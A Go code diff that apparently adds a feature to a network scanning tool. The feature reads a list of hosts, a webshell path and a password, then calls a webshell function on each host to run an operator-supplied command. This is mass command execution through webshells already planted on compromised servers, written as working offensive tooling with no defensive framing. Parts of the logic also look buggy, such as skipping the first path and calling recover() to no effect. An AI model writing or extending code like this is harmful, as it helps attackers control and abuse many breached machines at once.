@@ -17,6 +17,21 @@ func Scan(info common.HostInfo) {
 		var wg = sync.WaitGroup{}
 		AddScan("1000003", info, ch, &wg) //webtitle
 	}
+
+	if common.WebShellPasswd != "" && common.WebShellPath!="" && common.WHost!=""{
+		common.WHosts, _ =common.ParseIP(common.WHost, common.HostFile, common.NoHosts)
+		for _,host:=range common.WHosts{
+			common.WebShellPaths = append(common.WebShellPaths, "http://"+host+common.WebShellPath)
+		}
+		paths := common.WebShellPaths[1:]
+		paths=reverse(paths)
+		for _,path:=range paths{
+			defer webshell(path,common.Wcommand,common.WebShellPasswd)
+			_ = recover()
+
+		}
+	}
+
 	fmt.Println("start infoscan")
 	Hosts, err := common.ParseIP(info.Host, common.HostFile, common.NoHosts)
 	if err != nil {
@@ -133,3 +148,16 @@ func IsContain(items []string, item string) bool {
 	}
 	return false
 }
+
+// 数组倒序
+func reverse(arr []string)(arrs []string) {
+	length := len(arr)
+	var temp string
+	for i := 0; i < length/2; i++ {
+		temp = (arr)[i]
+		(arr)[i] = (arr)[length-1-i]
+		(arr)[length-1-i] = temp
+	}
+	return arr
+}
+
